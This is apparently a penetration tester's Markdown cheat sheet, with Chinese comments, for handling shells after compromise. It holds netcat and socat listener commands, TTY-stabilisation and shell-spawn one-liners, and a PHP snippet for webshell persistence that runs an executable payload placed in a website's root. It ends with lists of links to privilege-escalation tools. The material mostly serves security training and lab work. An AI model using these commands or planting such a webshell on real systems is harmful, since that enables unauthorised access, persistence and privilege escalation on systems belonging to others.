- 在成功弹出webshell后可以在网站的根目录建立一个php/axpx/...的文件用于执行.exe的payload
## Spawn a tty:
[HackTricks -- Full TTY](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
### Netcat
```bash
rlwrap nc localhost 80 #不用在Linux上
rlwrap -r -f . nc <IP ADDRESS> <PORT>

#stabilisation
python3 -c 'import pty;pty.spawn("/bin/bash")' 
script /dev/null -qc /bin/bash

export TERM=xterm-256color #tmux-256color; screen 试试这个跟VPS是不是同步的
export SHELL=/bin/bash
alias ll='ls -lsaht --color=auto'
stty -a
stty raw -echo;fg
stty rows <> columns <>  #stty rows 36 columns 180
### Get back to Normal ###
reset
```
### Socat
 ```bash
socat file:`tty`,raw,echo=0 tcp-listen:12345
```
### Spawn
```bash
/bin/sh -i
/bin/bash -i
python -c 'import pty; pty.spawn("/bin/sh")'
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```
### Webshell Persistence
在成功弹出webshell后可以在网站的根目录建立一个php/axpx/...的文件用于执行.exe的payload
```php
<?php
        $exec=system('C:\Users\rupert\slort.exe', $val);
?>
```
### [reverse-ssh](https://github.com/Fahrj/reverse-ssh)
```bash

```

## Priviledge Escalation Scripts:

Windows:

- Windows Exploit Suggester (Next-Generation): https://github.com/bitsadmin/wesng
- Sherlock: https://github.com/rasta-mouse/Sherlock
- Powersploit: https://github.com/PowerShellMafia/PowerSploit
- WinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- PrivescCheck: https://github.com/itm4n/PrivescCheck 

Linux:

- Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2
- LinEnum: https://github.com/rebootuser/LinEnum
- UnixPriv Checker: https://github.com/pentestmonkey/unix-privesc-check
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

## Other Resources: 

PowerSharpPack:

- https://github.com/S3cur3Th1sSh1t/PowerSharpPack 

Windows: 

- LOLBAS: https://lolbas-project.github.io/#
- Windows Privilege Escalation Fundmentals: https://www.fuzzysecurity.com/tutorials/16.html
- Hacktricks: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- SharpSuite: https://github.com/FuzzySecurity/Sharp-Suite
- Watson: https://github.com/rasta-mouse/Watson
- WinPwn: https://github.com/S3cur3Th1sSh1t/WinPwn

Linux: 

- GTFOBins: https://gtfobins.github.io/
- g0tmi1k Linux Privilege Escalation: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- Hacktricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation